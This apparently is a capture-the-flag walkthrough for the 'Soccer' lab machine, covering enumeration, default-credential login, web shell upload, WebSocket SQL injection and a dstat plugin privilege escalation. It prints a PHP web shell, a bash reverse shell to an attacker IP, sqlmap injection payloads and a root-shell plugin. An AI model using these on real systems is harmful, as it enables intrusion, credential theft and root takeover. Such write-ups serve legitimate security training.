

## Initial Enumeration

### Port Scanning
A comprehensive port scan revealed three open ports:
```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
```

The HTTP server on port 80 was redirecting to http://soccer.htb, requiring a hosts file update:
```bash
echo "10.129.173.77 soccer.htb" | sudo tee -a /etc/hosts
```

### Web Enumeration
Visiting the main website on port 80 revealed a standard template site for a soccer club. Further examination of the site structure led to the discovery of a Tiny File Manager installation at:
```
http://soccer.htb/tiny/
```

Additionally, I identified a potential subdomain from the website content:
```bash
echo "10.129.173.77 soc-player.soccer.htb" | sudo tee -a /etc/hosts
```

Visiting this subdomain revealed a ticketing system for soccer matches that communicated with a WebSocket server on port 9091.

## Gaining Initial Access

### Tiny File Manager
I attempted to access the Tiny File Manager with default credentials and was successful:
- **Username**: admin
- **Password**: admin@123

This provided access to the file system with upload capabilities. I noticed that the `/tiny/uploads` directory was writable.

### PHP Web Shell
I created a simple PHP web shell:
```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

I uploaded this shell to `/tiny/uploads/shell.php` using the file manager's upload functionality. I then accessed it at:
```
http://soccer.htb/tiny/uploads/shell.php?cmd=id
```

This confirmed command execution as the www-data user.

### Reverse Shell
I set up a netcat listener on my attack machine:
```bash
nc -lvnp 4444
```

Then executed a reverse shell payload through the web shell:
```
http://soccer.htb/tiny/uploads/shell.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.42/4444 0>%261'
```

This provided a reverse shell as the www-data user.

## Lateral Movement

### WebSocket SQL Injection
While enumerating the system, I discovered a Node.js application running on port 9091. This was the WebSocket server that was communicating with the soc-player.soccer.htb subdomain.

Examining the web application, I identified a ticket checking feature that took an ID parameter and returned ticket information. This parameter appeared vulnerable to SQL injection.

I used SQLMap to confirm the vulnerability:
```bash
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3
```

SQLMap confirmed both boolean-based and time-based blind SQL injection vulnerabilities:
```
Parameter: JSON id ((custom) POST) 
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"id": "-1533 OR 9982=9982"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id": "1234 AND (SELECT 5403 FROM (SELECT(SLEEP(5)))gMBy)"}
```

### Database Enumeration
I used SQLMap to enumerate the available databases:
```bash
sqlmap -u ws://soc-player.soccer.htb:9091 --dbs --data '{"id": "1234"}' --dbms mysql --batch --threads 10
```

This revealed several databases, including a non-default one called 'soccer_db':
```
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
```

I then enumerated the tables in the soccer_db database:
```bash
sqlmap -u ws://soc-player.soccer.htb:9091 -D soccer_db --tables --data '{"id": "1234"}' --dbms mysql --batch --threads 10
```

This revealed a single table called 'accounts':
```
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
```

Finally, I dumped the contents of the accounts table:
```bash
sqlmap -u ws://soc-player.soccer.htb:9091 -D soccer_db -T accounts --dump --data '{"id": "1234"}' --dbms mysql --batch --threads 10
```

This revealed credentials for a user named 'player':
```
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

### SSH Access
With the discovered credentials, I was able to establish an SSH connection:
```bash
ssh player@soccer.htb
```

This provided a shell as the player user.

## Privilege Escalation

### SetUID Binary Enumeration
I searched for SetUID binaries that could potentially be exploited:
```bash
find / -perm -4000 2>/dev/null
```

This revealed an unusual SetUID binary: `/usr/local/bin/doas` - an alternative to sudo typically found on OpenBSD systems.

### Doas Configuration
I searched for the doas configuration file:
```bash
find / -name doas.conf 2>/dev/null
```

This led me to `/usr/local/etc/doas.conf`, which contained:
```
permit nopass player as root cmd /usr/bin/dstat
```

This indicated that the player user could run the dstat command as root without a password.

### Dstat Plugin Exploitation
Research on dstat revealed that it supports custom plugins written in Python. These plugins are loaded from several directories, including `/usr/local/share/dstat/`.

I checked if I could write to this directory:
```bash
ls -la /usr/local/share/dstat/
```

Confirming it was writable, I created a malicious dstat plugin:
```bash
echo -e 'import os\n\nos.system("/bin/bash")' > /usr/local/share/dstat/dstat_exploit.py
```

I then executed dstat with my custom plugin using doas:
```bash
doas /usr/bin/dstat --exploit
```

This provided a root shell, successfully completing the privilege escalation.

```bash
root@soccer:/home/player# id
uid=0(root) gid=0(root) groups=0(root)
```